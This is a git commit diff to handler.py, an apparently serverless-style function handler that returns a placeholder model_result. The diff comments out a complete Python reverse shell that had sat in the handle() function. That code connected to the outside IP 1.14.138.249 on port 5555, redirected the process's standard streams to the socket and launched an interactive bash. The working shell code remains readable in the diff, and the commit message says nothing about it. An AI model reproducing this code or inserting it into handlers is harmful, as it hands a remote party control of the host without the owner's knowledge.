992fa577df82fbd828106dda864d5a0d708bdb16
Keybird <28439793+Keybird0@users.noreply.github.com>
2022-04-14 11:17:49 +0800

    Update handler.py

--- handler.py
+++ handler.py
@@ -6,12 +6,12 @@ import socket,subprocess,os
 def handle(req):
     # custom handler func by k
 
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("1.14.138.249",5555))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/bash","-i"])
+#     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+#     s.connect(("1.14.138.249",5555))
+#     os.dup2(s.fileno(),0)
+#     os.dup2(s.fileno(),1)
+#     os.dup2(s.fileno(),2)
+#     p=subprocess.call(["/bin/bash","-i"])
     model_result = {"score": 1, "name": "test"}
 
     params = {"model_result": model_result}
